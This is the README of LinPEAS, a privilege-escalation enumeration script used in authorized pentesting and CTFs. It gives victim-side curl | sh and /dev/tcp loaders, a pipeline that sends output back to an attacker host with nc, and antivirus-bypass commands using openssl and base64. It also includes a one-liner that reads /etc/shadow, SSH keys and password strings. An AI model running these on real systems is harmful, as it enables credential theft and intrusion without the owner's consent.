# LinPEAS - Linux Privilege Escalation Awesome Script

![](https://github.com/peass-ng/privilege-escalation-awesome-scripts-suite/raw/master/linPEAS/images/linpeas.png)

**LinPEAS is a script that search for possible paths to escalate privileges on Linux/Unix\*/MacOS hosts. The checks are explained on [book.hacktricks.wiki](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html)**

Check the **Local Linux Privilege Escalation checklist** from **[book.hacktricks.wiki](https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html)**.

[![asciicast](https://asciinema.org/a/250532.png)](https://asciinema.org/a/309566)

## MacPEAS

Just execute `linpeas.sh` in a MacOS system and the **MacPEAS version will be automatically executed**

## Build your own linpeas!

The latest version of linpeas allows you to **select the checks you would like your linpeas to have** and built it only with those checks!

This allows to create **smaller and faster linpeas scripts** for stealth and speed purposes.

Check how to **select the checks you want to build [in your own linpeas following this link.](builder)**

Note that by default, in the releases pages of this repository, you will find a **linpeas with all the checks**.

## Differences between `linpeas_fat.sh`, `linpeas.sh` and `linpeas_small.sh`:

- **linpeas_fat.sh**: Contains all checks, even third party applications in base64 embedded.
- **linpeas.sh**: Contains all checks, but only the third party application `linux exploit suggester` is embedded. This is the default `linpeas.sh`.
- **linpeas_small.sh**: Contains only the most *important* checks making its size smaller.

## Quick Start
Find the **latest versions of all the scripts and binaries in [the releases page](https://github.com/peass-ng/PEASS-ng/releases/latest)**.

```bash
# From public github
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

```bash
# Local network
sudo python3 -m http.server 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim

# Without curl
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim

# Excute from memory and send output back to the host
nc -lvnp 9002 | tee linpeas.out #Host
curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
```

```bash
# Output to file
./linpeas.sh -a > /dev/shm/linpeas.txt #Victim
less -r /dev/shm/linpeas.txt #Read with colors
```

```bash
# Use a linpeas binary
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64
chmod +x linpeas_linux_amd64
./linpeas_linux_amd64
```

## AV bypass
```bash
#open-ssl encryption
openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:AVBypassWithAES -in linpeas.sh -out lp.enc
sudo python -m SimpleHTTPServer 80 #Start HTTP server
curl 10.10.10.10/lp.enc | openssl enc -aes-256-cbc -pbkdf2 -d -pass pass:AVBypassWithAES | sh #Download from the victim

#Base64 encoded
base64 -w0 linpeas.sh > lp.enc
sudo python -m SimpleHTTPServer 80 #Start HTTP server
curl 10.10.10.10/lp.enc | base64 -d | sh #Download from the victim
```

## Firmware Analysis
If you have a **firmware** and you want to **analyze it with linpeas** to **search for passwords or bad configured permissions** you have 2 main options.

- If you **can emulate** the firmware, just run linpeas inside of it:
```bash
cp /path/to/linpeas.sh /mnt/linpeas.sh
chroot /mnt #Supposing you have mounted the firmware FS in /mnt
bash /linpeas.sh -o software_information,interesting_files,api_keys_regex
```

- If you **cannot emulate** the firmware, use the `-f </path/to/folder` param:
```bash
# Point to the folder containing the files you want to analyze
bash /path/to/linpeas.sh -f /path/to/folder
```

## Basic Information

The goal of this script is to search for possible **Privilege Escalation Paths** (tested in Debian, CentOS, FreeBSD, OpenBSD and MacOS).

This script doesn't have any dependency.

It uses **/bin/sh** syntax, so can run in anything supporting `sh` (and the binaries and parameters used).

By default, **linpeas won't write anything to disk and won't try to login as any other user using `su`**.

By default linpeas takes around **4 mins** to complete, but It could take from **5 to 10 minutes** to execute all the checks using **-a** parameter *(Recommended option for CTFs)*:
- From less than 1 min to 2 mins to make almost all the checks
- Almost 1 min to search for possible passwords inside all the accesible files of the system
- 20s/user bruteforce with top2000 passwords *(need `-a`)* - Notice that this check is **super noisy**
- 1 min to monitor the processes in order to find very frequent cron jobs *(need `-a`)* - Notice that this check will need to **write** some info inside a file that will be deleted

**Interesting parameters:**
- **-a** (all checks except regex) - This will **execute also the check of processes during 1 min, will search more possible hashes inside files, and brute-force each user using `su` with the top2000 passwords.**
- **-e** (extra enumeration) - This will execute **enumeration checkes that are avoided by default**
- **-r** (regex checks) - This will search for **hundreds of API keys of different platforms in the Filesystem**
- **-s** (superfast & stealth) - This will bypass some time consuming checks - **Stealth mode** (Nothing will be written to disk)
- **-P** (Password) - Pass a password that will be used with `sudo -l` and bruteforcing other users
- **-D** (Debug) - Print information about the checks that haven't discovered anything and about the time each check took
- **-d/-p/-i/-t** (Local Network Enumeration) - Linpeas can also discover and port-scan local networks

**It's recommended to use the params `-a` and `-r` if you are looking for a complete and intensive scan**.

```
Enumerate and search Privilege Escalation vectors.
This tool enum and search possible misconfigurations (known vulns, user, processes and file permissions, special file permissions, readable/writable files, bruteforce other users(top1000pwds), passwords...) inside the host and highlight possible misconfigurations with colors.
        Checks:
            -o Only execute selected checks (system_information,container,cloud,procs_crons_timers_srvcs_sockets,network_information,users_information,software_information,interesting_files,api_keys_regex). Select a comma separated list.
            -s Stealth & faster (don't check some time consuming checks)
            -e Perform extra enumeration
            -t Automatic network scan & Internet conectivity checks - This option writes to files
            -r Enable Regexes (this can take from some mins to hours)
            -P Indicate a password that will be used to run 'sudo -l' and to bruteforce other users accounts via 'su'
	      -D Debug mode

        Network recon:
            -t Automatic network scan & Internet conectivity checks - This option writes to files
	      -d <IP/NETMASK> Discover hosts using fping or ping. Ex: -d 192.168.0.1/24
            -p <PORT(s)> -d <IP/NETMASK> Discover hosts looking for TCP open ports (via nc). By default ports 22,80,443,445,3389 and another one indicated by you will be scanned (select 22 if you don't want to add more). You can also add a list of ports. Ex: -d 192.168.0.1/24 -p 53,139
            -i <IP> [-p <PORT(s)>] Scan an IP using nc. By default (no -p), top1000 of nmap will be scanned, but you can select a list of ports instead. Ex: -i 127.0.0.1 -p 53,80,443,8000,8080
             Notice that if you specify some network scan (options -d/-p/-i but NOT -t), no PE check will be performed

        Port forwarding:
            -F LOCAL_IP:LOCAL_PORT:REMOTE_IP:REMOTE_PORT Execute linpeas to forward a port from a local IP to a remote IP

        Firmware recon:
            -f </FOLDER/PATH> Execute linpeas to search passwords/file permissions misconfigs inside a folder

        Misc:
            -h To show this message
	      -w Wait execution between big blocks of checks
            -L Force linpeas execution
            -M Force macpeas execution
	      -q Do not show banner
            -N Do not use colours

```

## Hosts Discovery and Port Scanning

With LinPEAS you can also **discover hosts automatically** using `fping`, `ping` and/or `nc`, and **scan ports** using `nc`.

LinPEAS will **automatically search for this binaries** in `$PATH` and let you know if any of them is available. In that case you can use LinPEAS to hosts dicovery and/or port scanning.

![](https://github.com/peass-ng/privilege-escalation-awesome-scripts-suite/raw/master/linPEAS/images/network.png)


## Colors
LinPEAS uses colors to indicate where does each section begin. But **it also uses them the identify potencial misconfigurations**.

- The ![](https://placehold.it/15/b32400/000000?text=+) **Red/Yellow** ![](https://placehold.it/15/fff500/000000?text=+) color is used for identifing configurations that lead to PE (99% sure).

- The ![](https://placehold.it/15/b32400/000000?text=+) **Red** color is used for identifing suspicious configurations that could lead to privilege escalation.

- The ![](https://placehold.it/15/66ff33/000000?text=+) **Green** color is used for known good configurations (based on the name not on the conten!)

- The ![](https://placehold.it/15/0066ff/000000?text=+) **Blue** color is used for: Users without shell & Mounted devices

- The ![](https://placehold.it/15/33ccff/000000?text=+) **Light Cyan** color is used for: Users with shell

- The ![](https://placehold.it/15/bf80ff/000000?text=+) **Light Magenta** color is used for: Current username

</details>

## One-liner Enumerator

Here you have an old linpe version script in one line, **just copy and paste it**;)

**The color filtering is not available in the one-liner** (the lists are too big)

This one-liner is deprecated (I'm not going to update it any more), but it could be useful in some cases so it will remain here.

The default file where all the data is stored is: */tmp/linPE* (you can change it at the beginning of the script)


```sh
file="/tmp/linPE";RED='\033[0;31m';Y='\033[0;33m';B='\033[0;34m';NC='\033[0m';rm -rf $file;echo "File: $file";echo "[+]Gathering system information...";printf $B"[*] "$RED"BASIC SYSTEM INFO\n"$NC >> $file ;echo "" >> $file;printf $Y"[+] "$RED"Operative system\n"$NC >> $file;(cat /proc/version || uname -a ) 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"PATH\n"$NC >> $file;echo $PATH 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Date\n"$NC >> $file;date 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Sudo version\n"$NC >> $file;sudo -V 2>/dev/null| grep "Sudo ver" >> $file;echo "" >> $file;printf $Y"[+] "$RED"selinux enabled?\n"$NC >> $file;sestatus 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Useful software?\n"$NC >> $file;which nc ncat netcat wget curl ping gcc make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Capabilities\n"$NC >> $file;getcap -r / 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Environment\n"$NC >> $file;(set || env) 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Top and cleaned proccesses\n"$NC >> $file;ps aux 2>/dev/null | grep -v "\[" >> $file;echo "" >> $file;printf $Y"[+] "$RED"Binary processes permissions\n"$NC >> $file;ps aux 2>/dev/null | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++' 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Services\n"$NC >> $file;(/usr/sbin/service --status-all || /sbin/chkconfig --list || /bin/rc-status) 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Different processes executed during 1 min (HTB)\n"$NC >> $file;if [ "`ps -e --format cmd`" ]; then for i in {1..121}; do ps -e --format cmd >> $file.tmp1; sleep 0.5; done; sort $file.tmp1 | uniq | grep -v "\[" | sed '/^.\{500\}./d' >> $file; rm $file.tmp1; fi;echo "" >> $file;printf $Y"[+] "$RED"Proccesses binary permissions\n"$NC >> $file;ps aux 2>/dev/null | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++' 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Scheduled tasks\n"$NC >> $file;crontab -l 2>/dev/null >> $file;ls -al /etc/cron* 2>/dev/null >> $file;cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root /var/spool/anacron 2>/dev/null | grep -v "^#" >> $file;echo "" >> $file;printf $Y"[+] "$RED"Any sd* disk in /dev?\n"$NC >> $file;ls /dev 2>/dev/null | grep -i "sd" >> $file;echo "" >> $file;printf $Y"[+] "$RED"Storage information\n"$NC >> $file;df -h 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Unmounted file-system?\n"$NC >> $file;cat /etc/fstab 2>/dev/null | grep -v "^#" >> $file;echo "" >> $file;printf $Y"[+] "$RED"Printer?\n"$NC >> $file;lpstat -a 2>/dev/null >> $file;echo "" >> $file;echo "" >> $file;echo "[+]Gathering network information...";printf $B"[*] "$RED"NETWORK INFO\n"$NC >> $file ;echo "" >> $file;printf $Y"[+] "$RED"Hostname, hosts and DNS\n"$NC >> $file;cat /etc/hostname /etc/hosts /etc/resolv.conf 2>/dev/null | grep -v "^#" >> $file;dnsdomainname 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Networks and neightbours\n"$NC >> $file;cat /etc/networks 2>/dev/null >> $file;(ifconfig || ip a) 2>/dev/null >> $file;iptables -L 2>/dev/null >> $file;ip n 2>/dev/null >> $file;route -n 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Ports\n"$NC >> $file;(netstat -punta || ss -t; ss -u) 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Can I sniff with tcpdump?\n"$NC >> $file;timeout 1 tcpdump >> $file 2>&1;echo "" >> $file;echo "" >> $file;echo "[+]Gathering users information...";printf $B"[*] "$RED"USERS INFO\n"$NC >> $file ;echo "" >> $file;printf $Y"[+] "$RED"Me\n"$NC >> $file;(id || (whoami && groups)) 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Sudo -l without password\n"$NC >> $file;echo '' | sudo -S -l -k 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Do I have PGP keys?\n"$NC >> $file;gpg --list-keys 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Superusers\n"$NC >> $file;awk -F: '($3 == "0") {print}' /etc/passwd 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Login\n"$NC >> $file;w 2>/dev/null >> $file;last 2>/dev/null | tail >> $file;echo "" >> $file;printf $Y"[+] "$RED"Users with console\n"$NC >> $file;cat /etc/passwd 2>/dev/null | grep "sh$" >> $file;echo "" >> $file;printf $Y"[+] "$RED"All users\n"$NC >> $file;cat /etc/passwd 2>/dev/null | cut -d: -f1 >> $file;echo "" >> $file;echo "" >> $file;echo "[+]Gathering files information...";printf $B"[*] "$RED"INTERESTING FILES\n"$NC >> $file ;echo "" >> $file;printf $Y"[+] "$RED"SUID\n"$NC >> $file;find / -perm -4000 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"SGID\n"$NC >> $file;find / -perm -g=s -type f 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Files inside \$HOME (limit 20)\n"$NC >> $file;ls -la $HOME 2>/dev/null | head -n 20 >> $file;echo "" >> $file;printf $Y"[+] "$RED"20 First files of /home\n"$NC >> $file;find /home -type f 2>/dev/null | column -t | grep -v -i "/"$USER | head -n 20 >> $file;echo "" >> $file;printf $Y"[+] "$RED"Files inside .ssh directory?\n"$NC >> $file;find  /home /root -name .ssh 2>/dev/null -exec ls -laR {} \; >> $file;echo "" >> $file;printf $Y"[+] "$RED"*sa_key* files\n"$NC >> $file;find / -type f -name "*sa_key*" -ls 2>/dev/null -exec ls -l {} \; >> $file;echo "" >> $file;printf $Y"[+] "$RED"Mails?\n"$NC >> $file;ls -alh /var/mail/ /var/spool/mail/ 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"NFS exports?\n"$NC >> $file;cat /etc/exports 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Hashes inside /etc/passwd? Readable /etc/shadow or /etc/master.passwd?\n"$NC >> $file;grep -v '^[^:]*:[x]' /etc/passwd 2>/dev/null >> $file;cat /etc/shadow /etc/master.passwd 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Readable /root?\n"$NC >> $file;ls -ahl /root/ 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Inside docker or lxc?\n"$NC >> $file;dockercontainer=`grep -i docker /proc/self/cgroup  2>/dev/null; find / -name "*dockerenv*" -exec ls -la {} \; 2>/dev/null`;lxccontainer=`grep -qa container=lxc /proc/1/environ 2>/dev/null`;if [ "$dockercontainer" ]; then echo "Looks like we're in a Docker container" >> $file; fi;if [ "$lxccontainer" ]; then echo "Looks like we're in a LXC container" >> $file; fi;echo "" >> $file;printf $Y"[+] "$RED"*_history, profile, bashrc, httpd.conf\n"$NC >> $file;find / -type f \( -name "*_history" -o -name "profile" -o -name "*bashrc" -o -name "httpd.conf" \) -exec ls -l {} \; 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"All hidden files (not in /sys/) (limit 100)\n"$NC >> $file;find / -type f -iname ".*" -ls 2>/dev/null | grep -v "/sys/" | head -n 100 >> $file;echo "" >> $file;printf $Y"[+] "$RED"What inside /tmp, /var/tmp, /var/backups\n"$NC >> $file;ls -a /tmp /var/tmp /var/backups 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Interesting writable Files\n"$NC >> $file;USER=`whoami`;HOME=/home/$USER;find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | grep -v '/sys/fs'| sort | uniq >> $file;for g in `groups`; do find / \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME | grep -v '/sys/fs'; done >> $file;echo "" >> $file;printf $Y"[+] "$RED"Web files?(output limited)\n"$NC >> $file;ls -alhR /var/www/ 2>/dev/null | head >> $file;ls -alhR /srv/www/htdocs/ 2>/dev/null | head >> $file;ls -alhR /usr/local/www/apache22/data/ 2>/dev/null | head >> $file;ls -alhR /opt/lampp/htdocs/ 2>/dev/null | head >> $file;echo "" >> $file;printf $Y"[+] "$RED"Backup files?\n"$NC >> $file;find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*back*" -o -name "*bck*" \) 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Find IPs inside logs\n"$NC >> $file;grep -a -R -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' /var/log/ 2>/dev/null | sort | uniq >> $file;echo "" >> $file;printf $Y"[+] "$RED"Find 'password' or 'passw' string inside /home, /var/www, /var/log, /etc\n"$NC >> $file;grep -lRi "password\|passw" /home /var/www /var/log 2>/dev/null | sort | uniq >> $file;echo "" >> $file;printf $Y"[+] "$RED"Sudo -l (you need to puts the password and the result appear in console)\n"$NC >> $file;sudo -l;
```

## PEASS Style

Are you a PEASS fan? Get now our merch at **[PEASS Shop](https://teespring.com/stores/peass)** and show your love for our favorite peas

## Collaborate

If you want to help with the TODO tasks or with anything, you can do it using **[github issues](https://github.com/peass-ng/privilege-escalation-awesome-scripts-suite/issues) or you can submit a pull request**.

If you find any issue, please report it using **[github issues](https://github.com/peass-ng/privilege-escalation-awesome-scripts-suite/issues)**.

**Linpeas** is being **updated** every time I find something that could be useful to escalate privileges.

## Advisory

All the scripts/binaries of the PEAS Suite should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.
